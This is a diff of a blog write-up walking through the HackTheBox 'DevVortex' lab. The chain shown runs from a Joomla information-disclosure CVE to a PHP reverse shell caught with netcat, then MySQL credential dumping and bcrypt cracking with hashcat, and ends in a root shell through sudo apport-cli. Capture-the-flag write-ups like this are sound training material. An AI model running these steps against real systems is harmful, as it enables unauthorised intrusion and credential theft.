@@ -7,11 +7,13 @@ published: true
 tags: ["capture the flag", "hackthebox", "web", "networks"]
 ---
 
-# devvortex
+# DevVortex
 
 <aside>
-I feel like I use tools like LinPEAS too often, and in ways that aren't particularly helpful. This box was rated easy, and so I wanted to try privesc without relying it; unfortunately I think <code>user </code> -> <code>root</code> was probably a little <b>too</b> easy.
+Another easy HackTheBox machine demonstrating some vulnerabilities with readily-accessible proof-of-concept exploits.
 </aside>
+
+## Reconnaissance
 
 Running `rustscan` to enumerate for open ports, we’re given an `nginx` service on port 80 and an `ssh` service on port 22.
 
@@ -25,7 +27,8 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 ```
 
-We can’t access `ssh` without credentials, and there is nothing to find of particular interest on the webpage itself; I did some enumeration with `feroxbuster` and re-ran port scans with various options, but its just static HTML. Looking at some `nginx` vulnerabilities for `v1.18.0` was also a pretty big waste of time.
+We can’t access `ssh` without credentials, and there is nothing to find of particular interest on the webpage itself; I did some enumeration with `feroxbuster` and re-ran port scans with various options, but its just static HTML.
+Looking at some `nginx` vulnerabilities for `v1.18.0` was also a pretty big waste of time.
 
 I wasn’t *particularly* keen on having to enumerate for domain stuff - I’ll have to do more work to learn a tool or write code, but HTB often makes use of virtual hosts/subdomains, which we can enumerate for via the `Host` header of a HTTP GET request.
 
@@ -109,7 +112,9 @@ $ ./droopescan scan joomla --url <http://dev.devvortex.htb>                     
 [+] Scan finished (0:00:00.860053 elapsed)
 ```
 
-This version is vulnerable to `CVE-2023-23752`, which is an unauthenticated information disclosure vulnerability. We can exploit this to gain access to the CMS as a superuser with `lewis@devvortex.htb`'s credentials:
+## Initial access
+
+This version of Joomla is vulnerable to `CVE-2023-23752`, which is an unauthenticated information disclosure vulnerability. We can exploit this to gain access to the CMS as a superuser with `lewis@devvortex.htb`'s credentials:
 
 ```
 $ ruby exploit.rb <http://dev.devvortex.htb>
@@ -135,7 +140,6 @@ DB encryption 0
 ```
 
 > Also making a mental note of the `mysqli` DB.
->
 
 At this point, I kept getting the following error, alongside repeated invalidation of my session cookie and being kicked out of the CMS.
 
@@ -143,14 +147,16 @@ At this point, I kept getting the following error, alongside repeated invalidati
 
 I thought this was part of the box (it wasn’t) so I got stuck here for a *very* long time - this issue was persistent through box resets - but swapping to another HTB server fixed this issue.
 
-Similar to other CMS backends, like `Wordpress`, we can write malicious PHP to one of the template files (I used `/templates/cassiopiea/error.php`) and execute that as a PHP program; in this case, we can do the classic PentestMonkey PHP reverse shell script with our local IP and favorite port, start up a netcat listener, and make a GET request for `http://dev.devvortex.htb/templates/cassiopeia/error.php` to execute the script to get onto the machine via `ssh`.
+Similar to other CMS backends, like `Wordpress`, we can write malicious PHP to one of the template files (I used `/templates/cassiopiea/error.php`) and execute that as a PHP program; in this case, we can do the
+classic PentestMonkey PHP reverse shell script with our local IP and favorite port, start up a netcat listener, and make a GET request for `http://dev.devvortex.htb/templates/cassiopeia/error.php` to
+execute the script to get onto the machine via `ssh`.
 
 ![Untitled](/img/devvortex_img/Untitled%202.png)
 
 We can also run through some commands to upgrade the dumb shell session to a `tty` - this is more convenience than anything:
 
 - We can use the available `python3` binary to spawn a `pseudo-teletype`/`pty` with the `pty` module (`python3 -c 'import pty; pty.spawn("/bin/bash")`)
-- Then, upgrade the `pty` to a fully interactive `tty` by copying over some of our terminal environment - allowing the `ssh` session to register the keys we send exactly as we send them:
+- We can then upgrade the python-invoked `pty` to a fully interactive `tty` by copying over some of our terminal environment - allowing the `ssh` session to register the keys we send exactly as we send them:
 
 ```bash
 [please@ruby]:[~] $ nc -lnvp 9999                                                                                                                             130 ↵
@@ -198,58 +204,23 @@ Now `cat`’ing out `/etc/passwd`, we see that there are two users with login sh
 ```bash
 www-data@devvortex:/$ cat /etc/passwd
 root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
-syslog:x:104:110::/home/syslog:/usr/sbin/nologin
-_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
-tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
-uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
-landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
-pollinate:x:110:1::/var/cache/pollinate:/bin/false
-sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
-systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
-lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
-usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+[...]
 mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
 logan:x:1000:1000:,,,:/home/logan:/bin/bash
-_laurel:x:997:997::/var/log/laurel:/bin/false
 ```
 
-`cd`ing to `/home/logan`, the `user.txt` within is not readable to us, so instead we should check out the `mysqli` service using the credentials scraped from the Joomla vulnerability.
+## Privilege escalation | User
+
+Changing directory to `/home/logan`, the flag in `user.txt` isn't readable to us as `www-data`.
 
 ```bash
 www-data@devvortex:/home/logan$ ls -la
 total 28
-drwxr-xr-x 3 logan logan 4096 Nov 21 11:04 .
-drwxr-xr-x 3 root  root  4096 Sep 26 19:16 ..
-lrwxrwxrwx 1 root  root     9 Oct 26 14:58 .bash_history -> /dev/null
--rw-r--r-- 1 logan logan  220 Sep 26 19:16 .bash_logout
--rw-r--r-- 1 logan logan 3771 Sep 26 19:16 .bashrc
-drwx------ 2 logan logan 4096 Oct 26 15:12 .cache
--rw-r--r-- 1 logan logan  807 Sep 26 19:16 .profile
+[...]
 -rw-r----- 1 root  logan   33 Feb  5 12:53 user.txt
 ```
+
+Going back to the information scraped from the vulnerable Joomla! service, we can log into the `mysql` database as `lewis`:
 
 ```sql
 www-data@devvortex:/home/logan$ mysql --user=lewis --password=P4ntherg0t1n5r3c0n## --host=localhost
@@ -265,7 +236,11 @@ affiliates. Other names may be trademarks of their respective
 owners.
 
 Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.
+```
 
+Running a few SQL commands to focus in on potential account credentials, we are able to print off the `users` table:
+
+```
 mysql> show databases;
 +--------------------+
 | Database           |
@@ -301,9 +276,8 @@ mysql> select * from sd4fg_users;
 mysql>
 ```
 
-Terminal displays the horrific and illegible print-out of a wide SQL table as always, but the `$2y$10$...` prefix indicates we have some `bcrypt` hashes on our hands (I think they are cost-factor 10 hashes =  `2^10` Iterations. That could be a complete lie. Also kind of irrelevant).
-
-I don’t think we really care about `lewis` anymore, so we’ll grab `logan`'s hash and run it through `hashcat` against `rockyou.txt`:
+The `$2y$10$...` prefix in the values of the `password` column, however, indicates we have some `bcrypt` hashes that we can try to decrypt. I don’t think we really care about the `lewis` user anymore,
+so we’ll grab `logan`'s hash and run it through `hashcat` against the classic capture-the-flag wordlist `rockyou.txt`:
 
 ```bash
 [please@ruby]:[~/Documents/ctfs/htb/devvortex] $ hashcat --help | grep -ie "bcrypt"
@@ -315,23 +289,7 @@ I don’t think we really care about `lewis` anymore, so we’ll grab `logan`'s 
 [please@ruby]:[~/Documents/ctfs/htb/devvortex] $ hashcat -a 0 -m 3200 logan.bcrypt-hash ~/git/red_tools/SecLists/Passwords/Leaked-Databases/rockyou.txt
 hashcat (v6.2.6) starting
 
-CUDA API (CUDA 12.3)
-====================
-* Device #1: NVIDIA GeForce RTX 4090, 23126/24195 MB, 128MCU
-
-Minimum password length supported by kernel: 0
-Maximum password length supported by kernel: 72
-
-Hashes: 1 digests; 1 unique digests, 1 unique salts
-Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
-Rules: 1
-
-Optimizers applied:
-* Zero-Byte
-* Single-Hash
-* Single-Salt
-
-Watchdog: Temperature abort trigger set to 90c
+# ...
 
 Host memory required for this attack: 843 MB
 
@@ -344,30 +302,10 @@ Dictionary cache built:
 
 $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
 
-Session..........: hashcat
-Status...........: Cracked
-Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
-Hash.Target......: $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy...tkIj12
-Time.Started.....: Tue Feb  6 00:08:13 2024 (0 secs)
-Time.Estimated...: Tue Feb  6 00:08:13 2024 (0 secs)
-Kernel.Feature...: Pure Kernel
-Guess.Base.......: File (/home/please/git/red_tools/SecLists/Passwords/Leaked-Databases/rockyou.txt)
-Guess.Queue......: 1/1 (100.00%)
-Speed.#1.........:     7254 H/s (6.24ms) @ Accel:1 Loops:16 Thr:24 Vec:1
-Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
-Progress.........: 3072/14344384 (0.02%)
-Rejected.........: 0/3072 (0.00%)
-Restore.Point....: 0/14344384 (0.00%)
-Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
-Candidate.Engine.: Device Generator
-Candidates.#1....: 123456 -> dangerous
-Hardware.Mon.#1..: Temp: 52c Fan:  0% Util: 94% Core:2760MHz Mem:10501MHz Bus:16
-
-Started: Tue Feb  6 00:08:08 2024
-Stopped: Tue Feb  6 00:08:15 2024
+[...]
 ```
 
-Heading back to the server with plaintext credentials in hand, we can close out of our reverse shell, and login using `logan@<IP>`, using `tequieromucho` as the password:
+Heading back to the server with plaintext credentials in hand, we can close out of our reverse shell, and login using `logan@<IP>` with `tequieromucho` as the password:
 
 ```bash
 [please@ruby]:[~] $ ssh logan@10.129.45.143
@@ -380,37 +318,7 @@ Warning: Permanently added '10.129.45.143' (ED25519) to the list of known hosts.
 logan@10.129.45.143's password:
 Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-167-generic x86_64)
 
- * Documentation:  <https://help.ubuntu.com>
- * Management:     <https://landscape.canonical.com>
- * Support:        <https://ubuntu.com/advantage>
-
-  System information as of Mon 05 Feb 2024 02:09:14 PM UTC
-
-  System load:           0.01
-  Usage of /:            63.5% of 4.76GB
-  Memory usage:          16%
-  Swap usage:            0%
-  Processes:             172
-  Users logged in:       0
-  IPv4 address for eth0: 10.129.45.143
-  IPv6 address for eth0: dead:beef::250:56ff:feb9:3352
-
-  => There is 1 zombie process.
-
- * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
-   just raised the bar for easy, resilient and secure K8s cluster deployment.
-
-   <https://ubuntu.com/engage/secure-kubernetes-at-the-edge>
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-Enable ESM Apps to receive additional future security updates.
-See <https://ubuntu.com/esm> or run: sudo pro status
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
+[...]
 
 Last login: Tue Nov 21 10:53:48 2023 from 10.10.14.23
 logan@devvortex:~$ cat user.txt
@@ -428,6 +336,8 @@ Matching Defaults entries for logan on devvortex:
 User logan may run the following commands on devvortex:
     (ALL : ALL) /usr/bin/apport-cli
 ```
+
+## Privilege escalation | System root
 
 [This POC](https://github.com/DonnchaC/ubuntu-apport-exploitation) explains that viewing a crafted crash log can allow for code execution. We can’t just use any random file as this must be a *crafted* log, but the POC *does* include a `minimal-rce.crash` file that does the heavy lifting for us.
 We can copy/paste its contents into a file on the box and pass it to `apport-cli` that we invoke as `root` with `sudo apport-cli -c ./test.crash`:
@@ -451,7 +361,8 @@ Please choose (S/V/K/I/C): v
 
 ```
 
-Choosing option `V` opens the log in the `apport-cli` viewer, which seems to just be Vim or something (this is Ubuntu/GNOME-specific and I don't really know what Apport is - I use Arch btw). We can invoke a `root` shell with `!bash` and then `cat` out the second flag at `/root/root.txt`:
+Choosing option `V` opens the log in the `apport-cli` report viewer, which seems to almost just be a partially-modified Vim or Vi or something like that. We can invoke a `root` shell with `!bash` and then `cat` out the
+second flag at `/root/root.txt`:
 
 ```bash
 == CrashDB =================================
